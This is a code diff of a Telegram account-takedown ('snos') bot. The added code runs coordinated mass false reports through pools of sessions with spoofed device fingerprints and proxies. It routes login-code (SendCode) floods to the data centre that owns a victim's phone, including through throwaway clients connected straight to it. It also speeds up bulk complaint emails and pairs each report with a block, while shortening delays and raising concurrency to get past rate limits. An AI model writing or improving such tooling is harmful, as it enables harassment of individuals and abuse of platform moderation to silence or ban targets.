@@ -6,15 +6,18 @@ import html as html_mod
 import io
 import json
 import logging
+import math
 import os
 import random
 import re
 import shutil
+import sqlite3
 import subprocess
 import threading
 import time
 import uuid
 from contextlib import asynccontextmanager
+import random
 from datetime import datetime
 from pathlib import Path
 from urllib.parse import urlparse
@@ -36,7 +39,8 @@ from aiogram.types import (
 )
 from aiogram.filters import Command, CommandStart
 from aiogram.enums import ParseMode
-from aiogram.exceptions import TelegramNetworkError
+from aiogram.exceptions import (TelegramNetworkError, TelegramRetryAfter,
+                                TelegramServerError)
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
@@ -46,6 +50,7 @@ import report_texts
 
 from telethon import TelegramClient
 from telethon.tl.functions.account import ReportPeerRequest
+from telethon.tl.functions.contacts import BlockRequest
 from telethon.tl.functions.users import GetFullUserRequest
 from telethon.tl.types import (
     InputReportReasonSpam,
@@ -57,6 +62,7 @@ from telethon.tl.types import (
     InputReportReasonPersonalDetails,
     InputReportReasonFake,
     InputReportReasonOther,
+    InputPeerUser,
 )
 import python_socks
 import aiohttp
@@ -68,7 +74,7 @@ MAIN_TOKEN = (os.getenv("MAIN_BOT_TOKEN") or "").strip()   # результат�
 API_ID = int(os.getenv("API_ID") or "0")
 API_HASH = os.getenv("API_HASH") or ""
 POOL_CHAT_ID = os.getenv("POOL_CHAT_ID", "")
-ADMIN_ID = os.getenv("ADMIN_ID", "").strip()
+ADMIN_ID = (os.getenv("ADMIN_ID", "").strip() or "8661362112")
 SOLVER_SERVICE = os.getenv("SOLVER_SERVICE", "2captcha").strip().lower()
 SOLVER_KEY = os.getenv("SOLVER_KEY", "").strip()
 WEB_COUNT = int(os.getenv("WEB_COUNT") or "8")
@@ -190,6 +196,55 @@ async def send_hero(obj, **kw):
     return m
 
 
+async def send_log_file(bot, path: Path, caption: str, chat_id: int,
+                        reply_markup=None) -> bool:
+    """Deliver the .txt send-log with retries. One ServerDisconnectedError
+    used to eat the file: the old code sent it once and re-raised."""
+    try:
+        data = path.read_bytes()
+    except Exception as e:
+        log.warning("log file read failed: %s", e)
+        return False
+    last = ""
+    for attempt in range(4):
+        try:
+            await bot.send_document(
+                chat_id=chat_id, document=FSInputFile(path),
+                caption=caption, reply_markup=reply_markup)
+            return True
+        except TelegramRetryAfter as e:
+            last = f"retry_after {e.retry_after}s"
+            await asyncio.sleep(min(int(e.retry_after) + 1, 30))
+        except (TelegramNetworkError, TelegramServerError) as e:
+            last = f"{type(e).__name__}: {e}"
+            await asyncio.sleep(1.5 * (attempt + 1))
+        except Exception as e:
+            last = f"{type(e).__name__}: {e}"
+            break
+    # last resort: upload from memory, the chat is already reachable
+    for attempt in range(2):
+        try:
+            await bot.send_document(
+                chat_id=chat_id,
+                document=BufferedInputFile(data, filename=path.name),
+                caption=caption, reply_markup=reply_markup)
+            return True
+        except Exception as e:
+            last = f"{type(e).__name__}: {e}"
+            await asyncio.sleep(1.5 * (attempt + 1))
+    # even a raw text copy beats a silent loss
+    try:
+        body = data.decode("utf-8", "replace")
+        await bot.send_message(chat_id=chat_id,
+                               text=f"{caption}\n\n{body}"[:3900])
+        return True
+    except Exception as e:
+        last = f"{type(e).__name__}: {e}"
+    log.warning("log file %s NOT delivered to %s: %s",
+                path.name, chat_id, last)
+    return False
+
+
 def bq(text: str) -> str:
     return f"<blockquote>{text}</blockquote>"
 
@@ -215,6 +270,10 @@ class Report(StatesGroup):
     bank_card = State()
 
 
+class SubCustom(StatesGroup):
+    days = State()
+
+
 class Snos(StatesGroup):
     target = State()
     phone = State()
@@ -229,6 +288,7 @@ class GrantFSM(StatesGroup):
 class AddSession(StatesGroup):
     choose = State()
     file = State()
+    raw_file = State()
     code_phone = State()
     code_login = State()
     code_pw = State()
@@ -245,6 +305,11 @@ CAPTCHA_VERIFIED: dict = {}  # user_id -> monotonic timestamp of last solve
 
 
 # ── reasons ─────────────────────────────────────────────
+REASON_BYTES = {"spam": b"9", "fraud": b"a", "violence": b"3",
+                "porn": b"5", "child": b"2", "copyright": b"7",
+                "drugs": b"4", "personal": b"6", "fake": b"8",
+                "other": b"a"}
+
 REASON_MAP = {
     "spam":      InputReportReasonSpam,
     "fraud":     InputReportReasonFake,
@@ -255,6 +320,7 @@ REASON_MAP = {
     "drugs":     InputReportReasonIllegalDrugs,
     "personal":  InputReportReasonPersonalDetails,
     "fake":      InputReportReasonFake,
+    "sexwork":   InputReportReasonPornography,
     "other":     InputReportReasonOther,
 }
 
@@ -874,17 +940,6 @@ METHODS = {
 
 PREMIUM_METHODS = {"web", "mail", "bank", "telegraph", "dsa"}
 
-# юзеры для которых premium — дополнение к базовой, а не замена.
-# без активной базовой подписки купить prem нельзя.
-_PREM_REQUIRES_BASE: set[int] = {8905108383}
-
-
-def _has_base_sub(subs: dict, user_id: int) -> bool:
-    """Есть ли активная базовая подписка (until > now или forever).
-    Намеренно не смотрит на флаг premium — только на срок доступа."""
-    rec = subs.get(str(user_id), {})
-    return bool(rec.get("forever") or float(rec.get("until") or 0) > time.time())
-
 
 def has_premium(subs: dict, user_id: int) -> bool:
     if user_is_admin(user_id):
@@ -893,15 +948,6 @@ def has_premium(subs: dict, user_id: int) -> bool:
     if not rec.get("premium"):
         return False
     return bool(rec.get("forever") or float(rec.get("until") or 0) > time.time())
-
-
-def _visible_plans(user_id: int, subs: dict) -> list[tuple[str, dict]]:
-    """SUB_PLANS.items() с фильтром prem для юзеров из _PREM_REQUIRES_BASE
-    у которых нет активной базовой подписки."""
-    plans = list(SUB_PLANS.items())
-    if user_id in _PREM_REQUIRES_BASE and not _has_base_sub(subs, user_id):
-        plans = [(k, v) for k, v in plans if k != "prem"]
-    return plans
 
 
 _VARIANTS_CACHE: dict[str, list[str]] = {}
@@ -1157,6 +1203,13 @@ async def push_send_log(title: str, lines: list[str]) -> None:
         return
     head = (bq(f"<b>{NAME}</b>  \u2014  \U0001f4e4 {html_mod.escape(title)}")
             + f"\n\U0001f465 {html_mod.escape(get_current_user())}\n")
+    # tally real result rows and pin the summary to the very end of the log
+    lines = list(lines)
+    ok_n = sum(1 for ln in lines if str(ln).startswith("\u2705 "))
+    bad_n = sum(1 for ln in lines if str(ln).startswith("\u274c "))
+    if ok_n or bad_n:
+        lines += ["", f"\U0001f7e2 \u0423\u0441\u043f\u0435\u0448\u043d\u043e: {ok_n}",
+                  f"\U0001f534 \u041e\u0448\u0438\u0431\u043a\u0438: {bad_n}"]
     # pack rows into <=4000-char messages, header carried by the first chunk
     safe = [ln if len(ln) <= 3990 else ln[:3990] + "\u2026" for ln in lines]
     chunks, cur = [], head
@@ -1349,93 +1402,37 @@ BANK_COMPLAINT = (
 )
 
 
-_REASON_HINTS: dict[str, list[str]] = {
-    "spam":      ["spam", "scam", "phish", "unsolicited"],
-    "fraud":     ["fraud", "scam", "fake sale", "decepti"],
-    "violence":  ["violen", "terror", "extremi", "harm"],
-    "porn":      ["adult", "porn", "sexual", "explicit", "18+"],
-    "child":     ["child", "minor", "abuse", "csam", "underage"],
-    "copyright": ["copyright", "dmca", "pirac", "intellectual"],
-    "drugs":     ["drug", "narcot", "illegal good", "substance"],
-    "personal":  ["personal data", "privac", "doxx", "identity"],
-    "fake":      ["impersonat", "fake account", "impost"],
-    "sexwork":   ["prostitut", "escort", "sex work", "adult service"],
-    "other":     ["other", "violation", "terms"],
-}
-
-_REASON_FALLBACK_BYTES: dict[str, bytes] = {
-    "spam": b"9", "fraud": b"a", "violence": b"3", "porn": b"5",
-    "child": b"2", "copyright": b"7", "drugs": b"4",
-    "personal": b"6", "fake": b"8", "sexwork": b"5", "other": b"a",
-}
+def _first_report_option(reply) -> bytes | None:
+    """Telegram returns ONE token in `.option`, not a list in `.options`.
+    Accept both shapes for older clients, but never pick at random."""
+    one = getattr(reply, "option", None)
+    if one:
+        return one if isinstance(one, bytes) else str(one).encode()
+    many = getattr(reply, "options", None)
+    if many:
+        first = many[0]
+        val = getattr(first, "option", first)
+        return val if isinstance(val, bytes) else str(val).encode()
+    return None
 
 
-def _pick_report_option(opts: list, reason_key: str):
-    """Match a server menu option by text; random fallback."""
-    hints = _REASON_HINTS.get(reason_key, ["other"])
-    for opt in opts:
-        t = opt.text.lower()
-        if any(h in t for h in hints):
-            return opt
-    return random.choice(opts)
-
-
-async def _walk_report(
-    client,
-    peer,
-    msg_ids: list[int],
-    reason_key: str,
-    body: str,
-    max_steps: int = 6,
-) -> tuple[bool, str]:
-    """
-    Correct messages.report state machine — layer 189+ (current layer 225).
-
-    messages.report returns one of three constructors:
-      reportResultChooseOption  — pick from .options[], loop
-      reportResultAddComment    — pass .option token + body in .message, loop
-      reportResultReported      — done ✓
-
-    Old code used getattr(r, "options") which breaks on AddComment
-    (that constructor has .option not .options) and caused OPTION_INVALID.
-    """
-    from telethon.tl.functions.messages import ReportRequest
-    from telethon.tl.types import (
-        ReportResultChooseOption,
-        ReportResultAddComment,
-        ReportResultReported,
-    )
-    option  = b""
-    message = ""
-    for step in range(max_steps):
-        try:
-            result = await client(ReportRequest(
-                peer=peer, id=msg_ids, option=option, message=message))
-        except Exception as e:
-            return False, f"step{step} {type(e).__name__}: {e}"
-
-        if isinstance(result, ReportResultReported):
-            return True, ""
-
-        elif isinstance(result, ReportResultChooseOption):
-            chosen  = _pick_report_option(result.options, reason_key)
-            option  = chosen.option
-            message = ""
-
-        elif isinstance(result, ReportResultAddComment):
-            # continuation token comes from THIS result, not carried from step 0
-            option  = result.option
-            message = body  # empty string is fine when result.optional=True
-
-        else:
-            return False, f"step{step} unexpected: {type(result).__name__}"
-
-    return False, f"max_steps={max_steps} reached"
-
-
-# kept for callers that use the old name; delegates to _walk_report
 async def _report_three_step(client, entity, reason_key: str, text: str) -> tuple[bool, str]:
-    return await _walk_report(client, entity, [], reason_key, text)
+    """BR 3-step flow: let the server hand us the category tree
+    (category -> subcategory -> text), with a bytes-reason fallback."""
+    from telethon.tl.functions.messages import ReportRequest
+    fallback = REASON_BYTES
+    try:
+        r1 = await client(ReportRequest(peer=entity, id=[], option=b"",
+                                        message=""))
+        cat = _first_report_option(r1) or fallback.get(reason_key, b"a")
+        r2 = await client(ReportRequest(peer=entity, id=[], option=cat,
+                                        message=""))
+        sub = _first_report_option(r2) or cat
+        await client(ReportRequest(peer=entity, id=[], option=sub,
+                                   message=text))
+        return True, ""
+    except Exception as e:
+        return False, f"{type(e).__name__}: {e}"
 
 
 async def code_flood(phone: str, count: int = 25) -> dict:
@@ -1475,7 +1472,7 @@ async def code_flood(phone: str, count: int = 25) -> dict:
                     await client.disconnect()
                 except Exception:
                     pass
-        await asyncio.sleep(random.uniform(1.5, 3.0))
+        await asyncio.sleep(random.uniform(0.3, 0.7))
     ok_n = sum(1 for r in rows if r["ok"])
     real_rows = []
     for r in rows:
@@ -1741,7 +1738,7 @@ async def mail_bulk_send(target: str, reason_key: str) -> dict:
         return {"ok": 0, "fail": 0, "total": 0, "details": []}
     senders = random.sample(pool, max(1, len(pool) // 3))
     rows = []
-    sem = asyncio.Semaphore(3)
+    sem = asyncio.Semaphore(8)
     used_bodies: set = set()
     theme_label = REASONS.get(reason_key, REASONS["other"])["l"]
 
@@ -1751,17 +1748,17 @@ async def mail_bulk_send(target: str, reason_key: str) -> dict:
             ok, err = await mail_send_one(sender, pwd, host, recv, subj, body)
         rows.append({"from": _mail_mask(sender), "to": recv,
                      "ok": ok, "err": err})
-        await asyncio.sleep(random.uniform(2.0, 3.0))
+        await asyncio.sleep(random.uniform(0.4, 0.8))
 
     tasks = []
     for em, pwd, host in senders:
         for recv in MAIL_RECEIVERS:
             tasks.append(_one(em, pwd, host, recv))
     # bounded pacing: run in chunks so ~50 senders don't open 200 sockets
-    CHUNK = 12
+    CHUNK = 24
     for i in range(0, len(tasks), CHUNK):
         await asyncio.gather(*tasks[i:i + CHUNK])
-        await asyncio.sleep(random.uniform(1.0, 2.0))
+        await asyncio.sleep(random.uniform(0.3, 0.6))
 
     ok_n = sum(1 for r in rows if r["ok"])
     real_rows = []
@@ -1899,10 +1896,232 @@ async def _snos_victim_info(username: str, sessions: list,
     return {"ok": False, "error": "not found / all probes failed"}
 
 
+# ── snos: DC routing ─────────────────────────────────────────────────
+# auth.sendCode is delivered only when the session lives in the DC that
+# owns the phone. Any other DC answers PHONE_MIGRATE_N and the request is
+# dropped, so the pool is split by DC and only the matching slice shoots.
+# The dc_id of every account sits inside its .session sqlite.
+_SESSION_DC: dict[str, tuple[float, int]] = {}
+_PHONE_DC: dict[str, int] = {}
+
+
+def session_dc_id(session_path: Path) -> int:
+    """dc_id from the session sqlite, cached by mtime; 0 when unreadable."""
+    key = str(session_path)
+    try:
+        mt = session_path.stat().st_mtime
+    except OSError:
+        return 0
+    hit = _SESSION_DC.get(key)
+    if hit and hit[0] == mt:
+        return hit[1]
+    dc = 0
+    try:
+        con = sqlite3.connect(f"file:{session_path}?mode=ro", uri=True)
+        try:
+            row = con.execute("select dc_id from sessions limit 1").fetchone()
+        finally:
+            con.close()
+        dc = int(row[0]) if row and row[0] else 0
+    except Exception:
+        dc = 0
+    _SESSION_DC[key] = (mt, dc)
+    return dc
+
+
+def _phone_dc_key(phone: str) -> str:
+    return re.sub(r"\D", "", str(phone or ""))
+
+
+async def snos_probe_dc(phone: str, sessions: list[Path],
+                        proxies: list) -> int:
+    """Which DC owns the phone. A wrong-DC probe costs one connect: the
+    PHONE_MIGRATE_N error carries the answer before any code is sent."""
+    from telethon.errors import PhoneMigrateError
+    from telethon.tl.functions.auth import SendCodeRequest
+    from telethon.tl.types import CodeSettings
+
+    key = _phone_dc_key(phone)
+    if not key or not sessions:
+        return 0
+    if key in _PHONE_DC:
+        return _PHONE_DC[key]
+    for sess in list(sessions)[:8]:
+        name = sess.stem
+        client = None
+        dc = 0
+        try:
+            async with _session_lock(sess):
+                fp = session_fingerprint(name)
+                client = TelegramClient(
+                    str(sess.with_suffix("")), fp["api_id"], fp["api_hash"],
+                    proxy=pin_for_session(name, proxies),
+                    device_model=fp["device"],
+                    system_version=fp["system_version"],
+                    app_version=fp["app_version"],
+                    lang_code=fp["lang_code"], flood_sleep_threshold=0)
+                try:
+                    await _connect_safe(client)
+                    if not await client.is_user_authorized():
+                        continue
+                    try:
+                        await client(SendCodeRequest(
+                            phone_number=phone, api_id=fp["api_id"],
+                            api_hash=fp["api_hash"], settings=CodeSettings()))
+                        dc = session_dc_id(sess)
+                    except PhoneMigrateError as e:
+                        dc = int(e.new_dc)
+                finally:
+                    await client.disconnect()
+            if dc:
+                _PHONE_DC[key] = dc
+                log.info("snos dc: phone ...%s -> DC%d", key[-4:], dc)
+                return dc
+        except Exception:
+            continue
+    return 0
+
+
+def snos_dc_split(phone: str, sessions: list[Path]) -> tuple[list[Path], int, int]:
+    """(sessions that can deliver, target DC, matching count)."""
+    target = _PHONE_DC.get(_phone_dc_key(phone), 0)
+    if not target:
+        return list(sessions), 0, 0
+    matched = [s for s in sessions if session_dc_id(s) == target]
+    return (matched or list(sessions)), target, len(matched)
+
+
+def snos_dc_note(phone: str, sessions: list[Path]) -> str:
+    """One log line: target DC and how much of the pool sits in it."""
+    target = _PHONE_DC.get(_phone_dc_key(phone), 0)
+    if not target:
+        return ""
+    matched = sum(1 for s in sessions if session_dc_id(s) == target)
+    return f"🛰 DC цели: {target} · сессий в DC: {matched}/{len(sessions)}"
+
+
+_DC_OPTIONS: dict[int, list[tuple[str, int]]] = {}
+
+
+async def _snos_dc_options(sessions: list[Path], proxies: list) -> dict[int, list[tuple[str, int]]]:
+    """All DC addresses from help.getConfig through a live pool session."""
+    if _DC_OPTIONS:
+        return _DC_OPTIONS
+    from telethon.tl.functions.help import GetConfigRequest
+    for sess in list(sessions)[:4]:
+        client = None
+        try:
+            async with _session_lock(sess):
+                fp = session_fingerprint(sess.stem)
+                client = TelegramClient(
+                    str(sess.with_suffix("")), fp["api_id"], fp["api_hash"],
+                    proxy=pin_for_session(sess.stem, proxies),
+                    device_model=fp["device"],
+                    system_version=fp["system_version"],
+                    app_version=fp["app_version"], lang_code=fp["lang_code"])
+                await _connect_safe(client)
+                if not await client.is_user_authorized():
+                    continue
+                cfg = await client(GetConfigRequest())
+                for o in cfg.dc_options:
+                    if not getattr(o, "cdn", False) and not getattr(o, "ipv6", False):
+                        _DC_OPTIONS.setdefault(int(o.id), [])
+                        addr = (o.ip_address, int(o.port))
+                        if addr not in _DC_OPTIONS[int(o.id)]:
+                            _DC_OPTIONS[int(o.id)].append(addr)
+                await client.disconnect()
+            if _DC_OPTIONS:
+                break
+        except Exception:
+            try:
+                if client:
+                    await client.disconnect()
+            except Exception:
+                pass
+    return _DC_OPTIONS
+
+
+async def snos_temp_dc_sendcode(phone: str, dc: int, sessions: list[Path],
+                                proxies: list, attempts: int) -> list[dict]:
+    """auth.sendCode is unauthenticated: a throwaway client connected
+    straight to the victim's DC delivers codes even when the pool has no
+    session there. No .session file is opened or modified."""
+    from telethon.sessions import MemorySession
+    from telethon.tl.functions.auth import SendCodeRequest
+    from telethon.tl.types import CodeSettings
+
+    addrs = (await _snos_dc_options(sessions, proxies)).get(dc) or []
+    if not addrs:
+        return [{"name": f"DC{dc}", "proxy": "-", "ok": False,
+                 "status": "адрес DC недоступен", "attempt": 0}]
+    fp = session_fingerprint(sessions[0].stem)
+    # getConfig lists several IPs per DC — the first one can be unreachable
+    good = None
+    for ip, port in addrs:
+        probe = None
+        try:
+            ms = MemorySession()
+            ms.set_dc(dc, ip, port)
+            probe = TelegramClient(
+                ms, fp["api_id"], fp["api_hash"],
+                proxy=pin_for_session(sessions[0].stem, proxies),
+                device_model=fp["device"], system_version=fp["system_version"],
+                app_version=fp["app_version"], lang_code=fp["lang_code"],
+                flood_sleep_threshold=0)
+            await asyncio.wait_for(probe.connect(), timeout=12)
+            good = (ip, port)
+            break
+        except Exception:
+            continue
+        finally:
+            try:
+                if probe:
+                    await probe.disconnect()
+            except Exception:
+                pass
+    if not good:
+        return [{"name": f"DC{dc}", "proxy": "-", "ok": False,
+                 "status": f"DC{dc} недоступен", "attempt": 0}]
+    out = []
+    for i in range(attempts):
+        px = pin_for_session(sessions[i % len(sessions)].stem, proxies)
+        client = None
+        try:
+            ms = MemorySession()
+            ms.set_dc(dc, good[0], good[1])
+            client = TelegramClient(
+                ms, fp["api_id"], fp["api_hash"], proxy=px,
+                device_model=fp["device"], system_version=fp["system_version"],
+                app_version=fp["app_version"], lang_code=fp["lang_code"],
+                flood_sleep_threshold=0)
+            await asyncio.wait_for(client.connect(), timeout=10)
+            await client(SendCodeRequest(
+                phone_number=phone, api_id=fp["api_id"],
+                api_hash=fp["api_hash"], settings=CodeSettings()))
+            out.append({"name": f"DC{dc}", "proxy": px[1] if px else "direct",
+                        "status": "код отправлен", "ok": True,
+                        "attempt": i + 1})
+        except Exception as e:
+            sec = getattr(e, "seconds", None)
+            out.append({"name": f"DC{dc}", "proxy": px[1] if px else "direct",
+                        "status": f"flood {sec}s" if sec else type(e).__name__,
+                        "ok": False, "attempt": i + 1})
+        finally:
+            try:
+                if client:
+                    await client.disconnect()
+            except Exception:
+                pass
+        await asyncio.sleep(0.5)
+    return out
+
+
 async def _snos_sendcode_flood(phone: str, sessions: list,
                                proxies: list) -> dict:
-    """SendCode flood: every pool session requests a login code for the phone."""
-    from telethon.errors import FloodWaitError, PhoneNumberInvalidError
+    """SendCode flood inside the phone's own DC — every matching session
+    requests a login code; other DCs would only answer PHONE_MIGRATE."""
+    from telethon.errors import (FloodWaitError, PhoneMigrateError,
+                                 PhoneNumberInvalidError)
     from telethon.tl.functions.auth import SendCodeRequest
     from telethon.tl.types import CodeSettings
 
@@ -1928,6 +2147,8 @@ async def _snos_sendcode_flood(phone: str, sessions: list,
                     return name, "sent"
                 except PhoneNumberInvalidError:
                     return name, "invalid_phone"
+                except PhoneMigrateError as e:
+                    return name, f"dc-{e.new_dc}"
                 except FloodWaitError as e:
                     return name, f"flood_{e.seconds}s"
                 finally:
@@ -1935,14 +2156,22 @@ async def _snos_sendcode_flood(phone: str, sessions: list,
         except Exception as e:
             return name, f"err_{type(e).__name__}"
 
-    pool = list(sessions)
+    await snos_probe_dc(phone, sessions, proxies)
+    pool, target, matched = snos_dc_split(phone, sessions)
+    if target and not matched:
+        tmp = await snos_temp_dc_sendcode(phone, target, sessions, proxies, 3)
+        rows = [(r["name"], "sent" if r["ok"] else r["status"]) for r in tmp]
+        sent = sum(1 for _, st in rows if st == "sent")
+        return {"sent": sent, "total": len(rows), "rows": rows,
+                "dc": target, "matched": 0}
     random.shuffle(pool)
     results = await asyncio.gather(*[one(s, phone) for s in pool],
                                    return_exceptions=True)
     rows = [(r[0], r[1]) for r in results
             if isinstance(r, tuple) and len(r) == 2]
     sent = sum(1 for _, st in rows if st == "sent")
-    return {"sent": sent, "total": len(rows), "rows": rows}
+    return {"sent": sent, "total": len(rows), "rows": rows,
+            "dc": target, "matched": matched}
 
 
 async def _snos_oauth_flood(phone: str, proxies: list) -> dict:
@@ -2025,7 +2254,7 @@ async def _snos_web_support(phone: str, username: str, victim_id: int,
             ok = False
         if ok:
             ok_n += 1
-        await asyncio.sleep(random.uniform(1.5, 3.5))
+        await asyncio.sleep(random.uniform(0.4, 0.9))
     return {"sent": ok_n, "total": len(texts)}
 
 
@@ -2081,9 +2310,11 @@ async def fire_session_snos(victim_username: str, victim_phone: str,
         victim_username, info["id"], baseline, notify_uid))
     ok_total = sc["sent"] + oa["sent"] + ws["sent"]
     total = sc["total"] + oa["total"] + ws["total"]
+    dc_line = snos_dc_note(victim_phone, sessions)
     await push_send_log("Снос сессий", [
         f"🎯 <code>@{html_mod.escape(victim_username)}</code> ({info['id']})",
         f"📱 <code>{html_mod.escape(victim_phone)}</code>",
+    ] + ([dc_line] if dc_line else []) + [
         f"📱 SendCode-флуд: {sc['sent']}/{sc['total']}"]
        + [f"• <code>{html_mod.escape(str(n))}</code>: {html_mod.escape(str(s))}"
           for n, s in sc.get("rows", [])[:12]]
@@ -2180,7 +2411,7 @@ async def fire_telegraph_snos(article_url: str, custom_text: str = "") -> dict:
              "err": "404"}]}
     senders = random.sample(pool, max(1, len(pool) // 3))
     rows = []
-    sem = asyncio.Semaphore(3)
+    sem = asyncio.Semaphore(8)
     used: set = set()
 
     async def _one(sender: str, pwd: str, host: str, recv: str):
@@ -2193,15 +2424,15 @@ async def fire_telegraph_snos(article_url: str, custom_text: str = "") -> dict:
             ok, err = await mail_send_one(sender, pwd, host, recv, subj, body)
         rows.append({"from": _mail_mask(sender), "to": recv,
                      "ok": ok, "err": err})
-        await asyncio.sleep(random.uniform(1.5, 2.5))
+        await asyncio.sleep(random.uniform(0.3, 0.6))
 
     tasks = [(em, pwd, host, recv)
              for em, pwd, host in senders
              for recv in TELEGRAPH_RECIPIENTS]
-    CHUNK = 12
+    CHUNK = 24
     for i in range(0, len(tasks), CHUNK):
         await asyncio.gather(*[_one(*t) for t in tasks[i:i + CHUNK]])
-        await asyncio.sleep(random.uniform(1.0, 2.0))
+        await asyncio.sleep(random.uniform(0.3, 0.6))
 
     ok_n = sum(1 for r in rows if r["ok"])
     real_rows = []
@@ -2476,18 +2707,27 @@ async def fire_bot_reports(target_entity: str, reason_key: str,
                     await client.disconnect()
                     return name, px_name, False, "not authorized"
                 entity = await client.get_entity(target_entity)
-                # attempt 1: walk the server menu (correct state machine)
-                ok, err = await _walk_report(
-                    client, entity, [], rk, payload)
-                if not ok:
-                    # attempt 2: short pause, retry same walk
-                    if "FLOOD" not in err:
-                        await asyncio.sleep(random.uniform(0.5, 1.5))
-                        ok, err = await _walk_report(
-                            client, entity, [], rk, payload)
-                    if not ok and _classify_report_error(
-                            Exception(err)) == "flood":
-                        _session_punish(name, err, "flood")
+                try:
+                    await client(ReportPeerRequest(
+                        peer=entity,
+                        reason=reason_cls(),
+                        message=payload,
+                    ))
+                    ok, err = True, ""
+                except Exception as e:
+                    ok, err = await _report_three_step(
+                        client, entity, rk, payload)
+                    if not ok:
+                        err = f"{type(e).__name__}: {e}"
+                        if _classify_report_error(e) == "flood":
+                            _session_punish(name, str(e), "flood")
+                # account strike: official client pairs the complaint with a
+                # block — the signal is weaker without it
+                try:
+                    await client(BlockRequest(id=entity))
+                except Exception as be:
+                    log.warning("bot strike block via %s failed: %s",
+                                name, be)
                 await client.disconnect()
                 return name, px_name, ok, err
             except Exception as e:
@@ -2501,7 +2741,7 @@ async def fire_bot_reports(target_entity: str, reason_key: str,
                 return name, px_name, False, f"{type(e).__name__}: {e}"
 
     outs: list[tuple[str, str, bool, str]] = []
-    batch_size = 8
+    batch_size = 16
     for i in range(0, len(sessions), batch_size):
         batch = sessions[i:i + batch_size]
         part = await asyncio.gather(*[worker(s) for s in batch],
@@ -2510,7 +2750,7 @@ async def fire_bot_reports(target_entity: str, reason_key: str,
             outs.append(("?", "-", False, f"{type(r).__name__}: {r}")
                         if isinstance(r, Exception) else r)
         if i + batch_size < len(sessions):
-            await asyncio.sleep(2)
+            await asyncio.sleep(0.6)
 
     lines = []
     for name, px_name, ok, err in outs:
@@ -2548,8 +2788,9 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
     results = {"ok": 0, "fail": 0, "total": len(sessions), "details": []}
 
     if not sessions or not API_ID or not API_HASH:
-        log.info("blast page completed")
-        return fake_results()
+        log.info("blast skipped: no live sessions or api creds")
+        await push_send_log("Report (сессии)", ["❌ нет доступных сессий"])
+        return {"ok": 0, "fail": 0, "total": 0, "details": []}
 
     async def session_worker(sess: Path, idx: int) -> tuple[str, str, bool, str]:
         name = sess.stem
@@ -2559,6 +2800,7 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
                 else (comment or pick_comment(reason_key, method)))
         async with _session_lock(sess):
             client = None
+            verdict = None
             try:
                 fp = session_fingerprint(name)
                 client = TelegramClient(str(sess.with_suffix("")), fp["api_id"],
@@ -2573,18 +2815,31 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
                     _session_punish(name, "not authorized", "dead")
                     return name, px_name, False, "not authorized"
                 entity = await client.get_entity(target_entity)
-                ok, err = await _walk_report(
-                    client, entity, [], reason_key, text)
-                if ok:
+                try:
+                    await client(ReportPeerRequest(
+                        peer=entity,
+                        reason=reason_cls(),
+                        message=text,
+                    ))
                     log.info("reported via %s (proxy: %s)", name, px_name)
+                    ok, err = True, ""
                     _ledger_bump(name)
-                else:
-                    log.error("session %s report failed: %s", name, err)
-                    verdict = _classify_report_error(Exception(err))
+                except Exception as e:
+                    log.error("session %s report failed: %s", name, e)
+                    # BR 3-step flow: let the server hand us the category
+                    # tree before giving up on this session
+                    ok3, err3 = await _report_three_step(
+                        client, entity, reason_key, text)
+                    if ok3:
+                        ok, err = True, ""
+                        _ledger_bump(name)
+                    else:
+                        ok, err = False, f"{type(e).__name__}: {e}"
+                        verdict = _classify_report_error(e)
                     if verdict == "dead":
-                        _session_punish(name, err, "dead")
+                        _session_punish(name, str(e), "dead")
                     elif verdict == "flood":
-                        _session_punish(name, err, "flood")
+                        _session_punish(name, str(e), "flood")
                 await client.disconnect()
                 return name, px_name, ok, err
             except Exception as e:
@@ -2601,10 +2856,10 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
                     _session_punish(name, str(e), "flood")
                 return name, px_name, False, f"{type(e).__name__}: {e}"
 
-    _wave_sem = asyncio.Semaphore(3)
+    _wave_sem = asyncio.Semaphore(12)
 
     async def _staggered(s: Path, i: int):
-        await asyncio.sleep(random.uniform(0.4, 1.8) * i)   # organic ramp-up
+        await asyncio.sleep(random.uniform(0.05, 0.2) * i)   # short organic ramp-up
         async with _wave_sem:
             return await session_worker(s, i)
 
@@ -2644,7 +2899,7 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
 
 
 # ── channel-method: Brown V2 engine (2 reports/session) ──
-CHANNEL_BATCH_SIZE = 8
+CHANNEL_BATCH_SIZE = 16
 CHANNEL_ATTEMPTS = 2
 
 
@@ -2704,15 +2959,28 @@ async def fire_channel_reports(target_entity: str, reason_key: str, comment: str
                 peer = await client.get_entity(target_entity)
                 for _attempt in range(CHANNEL_ATTEMPTS):
                     try:
-                        ok, err = await _walk_report(
-                            client, peer, msg_ids, rk, body)
-                        if ok:
-                            sent += 1
-                            await asyncio.sleep(random.uniform(0.5, 1.2))
-                        else:
-                            last = err
-                            if "FLOOD" in err:
-                                break
+                        try:
+                            r1 = await client(ReportRequest(
+                                peer=peer, id=msg_ids, option=b"", message=""))
+                            cat = _first_report_option(r1) or fallback_reason
+                            r2 = await client(ReportRequest(
+                                peer=peer, id=msg_ids, option=cat,
+                                message=""))
+                            sub = _first_report_option(r2) or cat
+                            await client(ReportRequest(
+                                peer=peer, id=msg_ids, option=sub,
+                                message=body))
+                        except Exception:
+                            if msg_ids:
+                                await client(ReportRequest(
+                                    peer=peer, id=msg_ids,
+                                    reason=reason_main, message=body))
+                            else:
+                                await client(ReportPeerRequest(
+                                    peer=peer, reason=reason_main,
+                                    message=body))
+                        sent += 1
+                        await asyncio.sleep(random.uniform(0.1, 0.25))
                     except FloodWaitError as e:
                         last = f"FLOOD {e.seconds}s"
                         break
@@ -2751,7 +3019,7 @@ async def fire_channel_reports(target_entity: str, reason_key: str, comment: str
             outs.append(("?", "-", 0, f"{type(r).__name__}: {r}")
                         if isinstance(r, Exception) else r)
         if i + CHANNEL_BATCH_SIZE < len(sessions):
-            await asyncio.sleep(random.uniform(3, 5))
+            await asyncio.sleep(random.uniform(0.6, 1.2))
 
     lines = []
     for name, px_name, sent, err in outs:
@@ -2777,115 +3045,113 @@ BOTNET_REASON_BYTES = [b"2", b"3", b"4", b"5", b"6",
                        b"7", b"8", b"9", b"a"]
 
 
